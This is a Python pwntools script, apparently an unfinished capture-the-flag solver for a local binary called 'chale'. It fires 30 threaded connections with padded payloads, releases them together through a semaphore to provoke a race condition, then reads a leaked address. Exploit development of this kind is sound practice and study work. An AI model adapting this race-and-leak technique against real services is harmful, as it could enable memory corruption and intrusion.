#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
import threading
import time

exe = ELF("./chale")
# context.log_level='debug'
context.terminal = ["foot"]
# p = remote("addr", 1337)
# while True:
p2 = process([exe.path])
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p2, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)
    # return p
# p2 = gdbs()
p2.recvuntil("Port is ")
port = int(p2.recvline())
log.info(f"debug: {str(port)}")
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
# sync = threading.Semaphore()
print("pid of the main: ",p2.pid)
event = threading.Event()
# i = 0
# Raw intereraction with challenge frontend
PIPE_BUF = 0x1000
# os.system("ps aux | grep chale")
event = threading.Semaphore()
def sdata(payload,author,event):
    print("waiting -> ")
    p = remote("0",port)
    payload = payload.ljust(PIPE_BUF,p8(0))
    # event.wait()
    event.acquire()
    p.sendlineafter("?",payload)
    p.sendlineafter("rding purposes!",author)
# send_stage("aaaaaaaaaa")
for i in range(30):
    payload = p32(1)+p32(0xDEADBEEF)
    # print("payload -> ",payload)
    author = str(i).encode()*63
    mthread = threading.Thread(target=sdata,args=(payload,author,event))
    mthread.daemon = True
    mthread.start()
gdb.attach(p2.pid+1)
input("enter to release -> ")
# sleep(1)
# event.set()
print("all are released-> ")
event.release(30)
# try:
# a = p2.recvuntil("Message",timeout=1)
# print(f"debug: {a}")
# if a != b'':
#     gdb.attach(p2.pid+1)
#     p2.interactive()
#     p.interactive()
#     input()
p2.recvuntil("Message ")
address = int(p2.recvuntil(" is ",drop=True),16)
log.info(f"address: {hex(address)}")
# input()
# p2.close()
# except EOFError:
#     pass
# allthing = p.recvall(timeout=1)
# print(allthing)
p2.interactive()

        
    # input("send data2 -> ")
    # pp.sendlineafter("?","\n"*1000)
    # pp.sendlineafter("rding purposes!","b"*10)







# p.interactive()
# input("server interactive mode -> ")
# good luck pwning :)

